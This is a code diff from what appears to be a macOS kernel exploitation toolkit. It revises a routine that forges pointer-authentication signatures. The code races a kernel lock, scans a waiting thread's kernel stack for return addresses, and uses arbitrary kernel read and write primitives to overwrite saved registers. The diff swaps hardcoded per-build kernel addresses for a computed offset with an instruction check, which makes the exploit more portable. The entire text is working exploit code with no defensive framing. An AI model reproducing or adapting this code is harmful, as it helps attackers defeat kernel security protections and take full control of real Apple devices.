@@ -21,26 +21,16 @@
 #include "util/assert.h"
 #include "util/log.h"
 #include "util/misc.h"
+#include "util/asm.h"
 #include "iokit/os_dictionary.h"
 #include "iokit/io_surface.h"
 
 #include "macos_params.h"
 
+#define LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET 0x24c
+
 #define KALLOC_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 3 / 16)
 #define KERNEL_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 64 / 16)
-
-#if MACOS_VERSION == v21E5212f && MACOS_KERNEL_VARIANT == T6000
-#define LR_ENSURE_CAPACITY_KFREE 0xfffffe0007920b98
-#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072c9660
-#elif MACOS_VERSION == v21E230 && MACOS_KERNEL_VARIANT == T8101
-#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00079205d4
-#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072c9560
-#else
-#error "unknown platform"
-#endif
-
-#define KALLOC_TO_KERNEL_MAP_SWITCH_LEN 64512
-#define STACK_SCAN_SIZE 8192
 
 
 IOSurfaceRef xe_util_pacda_iosurface_create(void) {
@@ -151,35 +141,21 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     dispatch_semaphore_wait(sem_add_value_start, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_add_value_start);
     
-    int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 5000);
+    uintptr_t lr_lck_rw_excl_gen_stack_ptr;
+    int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 0, &lr_lck_rw_excl_gen_stack_ptr);
     xe_assert_err(error);
     
-    uintptr_t kstackptr = xe_util_pacda_get_kstack_ptr(*waiting_thread);
-    if (kstackptr == 0) {
-        error = EAGAIN;
-        goto exit;
-    }
+    uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
     
-    stack = malloc(STACK_SCAN_SIZE);
-    kstackptr -= STACK_SCAN_SIZE;
-    xe_kmem_read(stack, kstackptr, 0, STACK_SCAN_SIZE);
+    uintptr_t lr_kfree_stack_ptr;
+    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XE_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
+    xe_assert_err(error);
     
-    uintptr_t lr_kfree = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_ENSURE_CAPACITY_KFREE), XE_PTRAUTH_MASK);
-    if (lr_kfree == 0) {
-        error = EAGAIN;
-        goto exit;
-    }
-        
-    uintptr_t lr_lck_rw_excl_gen = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_LCK_RW_LOCK_EXCLUSIVE_GEN), XE_PTRAUTH_MASK);
-    if (lr_lck_rw_excl_gen == 0) {
-        error = EAGAIN;
-        goto exit;
-    }
-    
-    uintptr_t x19 = lr_kfree - 0x10; // dict
+    uintptr_t x19 = lr_kfree_stack_ptr - 0x10; // dict
     uintptr_t x20 = x19 - 0x8; // pacda ptr
     uintptr_t x21 = x20 - 0x8; // dict capacity
-    uintptr_t x23 = lr_lck_rw_excl_gen - 0x30; // pacda ctx
+    uintptr_t x23 = lr_lck_rw_excl_gen_stack_ptr - 0x30; // pacda ctx
 
     uintptr_t dict = xe_kmem_read_uint64(x19, 0);
     xe_kmem_write_uint64(x23, 0, ctx);
